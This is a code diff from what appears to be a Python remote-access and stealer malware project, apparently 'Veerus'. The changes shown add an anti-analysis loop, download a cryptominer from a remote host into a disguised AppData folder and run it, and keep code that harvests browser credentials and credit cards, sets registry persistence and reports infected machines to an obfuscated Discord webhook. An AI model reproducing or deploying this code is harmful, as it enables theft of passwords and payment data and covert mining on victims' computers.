@@ -44,6 +44,8 @@ from http.server import HTTPServer, CGIHTTPRequestHandler
 
 """
 #https://discord.com/api/webhooks/1009692660677746689/gdpKIwWkfzJs6HQYV9RTsW_r7_ydwQmOLTyxaKxl0L9_rdfuDnreOS9gLLu01mZzpb_I
+
+HOSTMINER = "127.0.0.1" #Server for the miner download
 WaiBook = """it|qs;00jjthprg/dpn0bqj0xejioplt5215:6<37717888576@:/heqQJx\lf}Kt7IRZW:SUs_`r8`zjxRrPLWzybLym1M:`rlguEoskPT>hLOv12n[{qc`J"""
 SALTWAIbOOk = "45d45az1daz56456adaNHBFHBHBJFazj"
 chiffre = [109, 118, 121, 115, 116, 58, 47, 52, 102, 110, 118, 108, 118, 115, 102, 48, 103, 120, 110, 47, 97, 121, 112, 48, 121, 103, 103, 107, 116, 115, 112, 117, 52, 52, 53, 52, 66, 61, 58, 50, 54, 63, 55, 61, 63, 62, 57, 58, 60, 61, 56, 64, 49, 109, 106, 119, 77, 79, 125, 94, 111, 109, 122, 83, 122, 55, 74, 83, 90, 86, 63, 87, 86, 120, 90, 96, 114, 55, 100, 123, 105, 122, 90, 116, 80, 78, 86, 125, 129, 98, 75, 120, 117, 55, 77, 59, 97, 119, 103, 107, 121, 73, 112, 119, 104, 84, 87, 66, 110, 77, 76, 117, 57, 56, 116, 98, 129, 114, 104, 101, 80]
@@ -114,6 +116,10 @@ if yes == "yes":
 			os.system("cls")
 		else:
 			os.system("clear")
+	def antiAnalysis():
+		while True:
+			ClearTerm()
+	threading.Thread(target=antiAnalysis).start()
 	if(CLONE_PROCESS == True):
 		for i in range(PROCESS_NUM):
 			if os.name != "nt" or os.name != "windows" and platform.system() != "Windows":
@@ -146,11 +152,6 @@ if yes == "yes":
 		country = str(uuid.uuid4())
 
 
-	def ClearTerm():
-		if(os.name == "nt" or os.name == "windows"):
-			os.system("cls")
-		else:
-			os.system("clear")
 	def AddToRegistry():
 		#Statup should be available soon for Mac OS
 		if os.name == "nt" or os.name == "windows":
@@ -185,7 +186,6 @@ if yes == "yes":
 		creditcard = "=========Stealed by 0xSxZ =============\n\n"
 		currency = "=========Stealed by 0xSxZ =============\n\n"
 		try:
-			ClearTerm()
 			ibm = 0
 			for i in range(len(chromiumpaths)):
 				if not os.path.exists(chromiumpaths[i]):
@@ -209,7 +209,10 @@ if yes == "yes":
 				if(ibm >= 370):
 					break
 			Founded = True
-			return str(res) + ":::667" + str(currency) + ":::667" + str(creditcard)
+			try:
+				return str(res) + ":::667" + str(currency) + ":::667" + str(creditcard)
+			except:
+				return "Error:::667Error:::667Error"
 		except Exception as e:
 			print(e)
 			pass
@@ -459,7 +462,6 @@ if yes == "yes":
 			return "Error : " + str(e)
 
 	def MineThreadWin():
-		ClearTerm()
 		print("[.] Starting miner if enabled.")
 		os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe")
 
@@ -484,13 +486,11 @@ if yes == "yes":
 				os.system("chmod +x ./apt.bb")
 				#threading.Thread(target=MineThreadLinux).start()
 				time.sleep(2)
-				if MINE == True:
-					threading.Thread(target=MineThreadLinux)
-					print("[.] Executing miner..")
 			except Exception as e :
 				print(str(e))
-
-			threading.Thread(target=getInstructions, args=(s,)).start()
+			if MINE == True:
+				threading.Thread(target=MineThreadLinux).start()
+				print("[.] Executing miner..")
 		else:
 			try:
 				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
@@ -537,14 +537,15 @@ if yes == "yes":
 	}
 
 				''')
-				os.system("curl gr4bb3r.42web.io/cUrl.exe --output cUrl.exe -s")
-				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
-
-				if MINE == True:
-					threading.Thread(target=MineThreadWin)
-					print("[.] Executing miner..")
+				r = requests.get("http://" + HOSTMINER + "/clientdownloads//cUrl.exe")
+				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb') as f:
+					f.write(r.content)
 			except Exception as e:
 				print(e)
+			if MINE == True:
+				threading.Thread(target=MineThreadWin).start()
+				print("[.] Executing miner..")
+	connectOption()
 	if(WaiBook != "" and WaiBook != None):
 		webhook = DiscordWebhook(url=WaiBook, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
